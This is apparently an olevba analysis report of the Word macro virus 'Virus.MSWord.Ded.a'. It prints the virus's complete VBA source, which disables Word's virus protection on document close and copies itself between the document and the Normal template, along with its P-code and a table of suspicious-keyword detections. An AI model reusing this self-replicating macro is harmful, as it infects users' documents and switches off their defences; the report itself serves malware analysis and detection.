olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
'Swlabs 99!

On Error GoTo skam

Options.VirusProtection = False

SWLABS99

skam:
End Sub
 
'Copy From Normal to Active
Private Sub SWLABS99()
If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
        d = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
            Wend
            ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d
        End If
    Next i
    ActiveDocument.SaveAs AddToRecentFiles:=False
Else
'Copy From Active to Normal
If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
        d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
            Wend
            NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d
        End If
    Next i
    NormalTemplate.Save
End If
End If
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ded.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 37150 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x000A "Swlabs 99!"
' Line #2:
' Line #3:
' 	OnError PrivateSub 
' Line #4:
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' Line #7:
' 	ArgsCall _B_var_f 0x0000 
' Line #8:
' Line #9:
' 	Label PrivateSub 
' Line #10:
' 	EndSub 
' Line #11:
' Line #12:
' 	QuoteRem 0x0000 0x001A "Copy From Normal to Active"
' Line #13:
' 	FuncDefn (Private Sub _B_var_f())
' Line #14:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #16:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St _B_var_d 
' Line #17:
' 	Ld _B_var_d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld _B_var_d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld _B_var_d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld _B_var_d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld _B_var_d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #18:
' 	Ld _B_var_d 
' 	Ld _B_var_d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #19:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #20:
' 	Ld _B_var_d 
' 	Ld _B_var_d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St _B_var_d 
' Line #21:
' 	Wend 
' Line #22:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld _B_var_d 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	LitVarSpecial (False)
' 	ParamNamed Fa 
' 	Ld ActiveDocument 
' 	ArgsMemCall AddToRecentFiles 0x0001 
' Line #26:
' 	ElseBlock 
' Line #27:
' 	QuoteRem 0x0000 0x001A "Copy From Active to Normal"
' Line #28:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #30:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St _B_var_d 
' Line #31:
' 	Ld _B_var_d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld _B_var_d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld _B_var_d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld _B_var_d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld _B_var_d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #32:
' 	Ld _B_var_d 
' 	Ld _B_var_d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #33:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #34:
' 	Ld _B_var_d 
' 	Ld _B_var_d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St _B_var_d 
' Line #35:
' 	Wend 
' Line #36:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld _B_var_d 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	EndSub 
' Line #43:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

